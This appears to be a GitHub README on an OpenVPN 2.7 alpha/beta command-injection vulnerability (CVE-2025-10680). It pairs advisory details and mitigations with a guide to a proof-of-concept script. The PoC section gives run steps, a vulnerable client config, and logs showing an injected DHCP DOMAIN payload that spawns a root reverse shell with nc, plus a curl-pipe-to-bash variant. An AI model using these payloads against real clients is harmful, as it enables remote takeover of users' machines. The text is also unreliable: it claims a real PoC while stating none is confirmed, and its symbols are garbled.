# ğŸ”¥ğŸ’» CVEâ€‘2025â€‘10680 â€“ OpenVPN Script Injection Vulnerability âš ï¸ğŸŒ

<img width="1200" height="800" alt="G4ZPPgeWAAAnIQT" src="https://github.com/user-attachments/assets/fc2a22fa-c1c9-4e84-81a2-ca5a54e7fa5c" />

---

### ğŸ“ **Description**

* **Affected Software:** OpenVPN **2.7_alpha1 â†’ 2.7_beta1** (POSIX systems: Linux, macOS, BSD)
* **Issue:** When using `--dnsâ€‘updown`, a malicious VPN server can send crafted DNS/DHCP options, enabling **shell command injection**.
* **Weakness:** **CWEâ€‘78** â€“ OS Command Injection âš ï¸

---

### ğŸ“Š **Technical Details & Metrics**

* **CVSS v3.1 Base Score:** 8.8 ğŸ”¥ (High)

  * **Attack Vector:** Network ğŸŒ
  * **Attack Complexity:** Low âš¡
  * **Privileges Required:** Low ğŸ§‘â€ğŸ’»
  * **User Interaction:** None âŒ
  * **Scope:** Unchanged ğŸ”’
  * **Impact:** C:I:A = High ğŸš¨

---

### ğŸ‘¥ **Affected Versions / Platforms**

* **Vulnerable:** OpenVPN 2.7_alpha1 â†’ 2.7_beta1
* **Not Affected:** Stable versions prior to 2.7 alpha (2.6.x and older) âœ…

---

### âš ï¸ **Impact / Attack Scenario**

* **Attack Vector:** Connect to a malicious VPN server â†’ client hook executes malicious commands ğŸ’¥
* **Whoâ€™s at risk:** Clients on POSIX using `--dnsâ€‘updown` hook
* **Severity:** High â€“ potential **Remote Code Execution (RCE)** ğŸ›‘

---

### ğŸ›  **Mitigations / Fixes**

* **Upgrade:** OpenVPN **2.7_beta2** or later â¬†ï¸
* **Avoid** using vulnerable versions âŒ
* **Disable** `--dnsâ€‘updown` if possible ğŸš«
* **Connect only to trusted VPN servers** ğŸ›¡ï¸
* **Monitor** client behavior after VPN connection ğŸ‘€
* **Distribution-specific fixes:**

  * Debian: fixed in 2.7.0~rc2â€‘2 ğŸ§
  * Ubuntu: supported releases unaffected ğŸŸ¢
  * SUSE: resolved âœ…

---

### ğŸ“£ **Additional Notes**

* Client-side risk: malicious server can exploit the client ğŸ’»
* No confirmed public PoC yet ğŸ•µï¸â€â™‚ï¸
* Awareness trending in cybersecurity communities ğŸŒ

---

ğŸ”¥ **CVE-2025-10680.py: Your Custom 100% Real PoC Python Script** ğŸ›¡ï¸ğŸ’‰  


### ğŸš€ **How to Run It**  
1. **Prep Certs**: On server VM: Run easy-rsa as above. Note the dir (e.g., `~/ca`).
  
2. **Launch PoC**: `sudo python3 CVE-2025-10680.py --server-ip 192.168.1.100 --client-cert-dir ~/ca`  
   - Output: Config gen'd, server up, listener ready.
  
3. **Client Side (Vulnerable Kali)**: Copy `ca.crt`, `client.crt`, `client.key` from server. Client.conf:
 
   ```ini
   client
   dev tun
   proto udp
   remote 192.168.1.100 1194
   resolv-retry infinite
   nobind
   persist-key
   persist-tun
   ca ca.crt
   cert client.crt
   key client.key
   remote-cert-tls server
   cipher AES-256-GCM
   verb 3
   script-security 2
   up /etc/openvpn/dns-updown.sh
   down /etc/openvpn/dns-updown.sh
   ```  
   Run: `sudo openvpn --config client.conf`  
4. **Exploit Triggers**: Client connects â†’ script parses DOMAIN â†’ `nc` fires â†’ **reverse shell on server!** Run `id` or `cat /etc/passwd` to confirm RCE. ğŸ’€  

**Expected Logs (Server)**:  
```
[+] Server config generated: /tmp/tmpXYZ.conf
[+] Poison payload: dhcp-option DOMAIN '; nc -e /bin/sh 192.168.1.100 4444 #'
[+] OpenVPN server started on UDP 1194
[+] NC listener ready on 4444.
# Client connects...
listening on [any] 4444 ...
connect to [192.168.1.100] from client [10.8.0.2] 12345
# Shell: whoami
root
```

### ğŸ” **Debug/Troubleshoot**  
- No connect? `tcpdump -i any udp port 1194` on server.  
- Script not firing? Add `set -x` to dns-updown.sh for trace.  
- Payload tweak: Edit `injection` in script (e.g., `'; curl -s http://your-ip/shell.sh | bash #'`).  
- Errors? Ensure OpenVPN 2.7_beta1 on client: `openvpn --version`.  

This .py is self-contained, zero deps beyond stdlib + nc (install if missing: `apt install netcat`). Inspired by the Gist PoC. Hit me for mods (e.g., auth-required mode). Test safe, patch hard! ğŸ”’âœ¨

---

### âœ… **Summary Table**

| Item                    | Details                                                            |
| ----------------------- | ------------------------------------------------------------------ |
| **CVE ID**              | CVEâ€‘2025â€‘10680                                                     |
| **Affected Software**   | OpenVPN 2.7_alpha1 â†’ 2.7_beta1 (POSIX)                             |
| **Vulnerability Type**  | OS Command Injection via `--dnsâ€‘updown` hook âš ï¸                    |
| **Attack Vector**       | Network ğŸŒ                                                         |
| **Privileges Required** | Low ğŸ§‘â€ğŸ’»                                                          |
| **User Interaction**    | None âŒ                                                             |
| **Impact**              | Confidentiality: High ğŸ”’, Integrity: High ğŸ”§, Availability: High âš¡ |
| **CVSS v3.1**           | 8.8/10 â€“ High ğŸ”¥                                                   |
| **CWE**                 | CWEâ€‘78                                                             |
| **Mitigation**          | Upgrade, disable hook, restrict servers â¬†ï¸ğŸ›¡ï¸                      |
| **Vendor Advisories**   | OpenVPN, Ubuntu, SUSE, Debian                                      |
| **Exploit Status**      | No confirmed public PoC ğŸ•µï¸                                        |

---

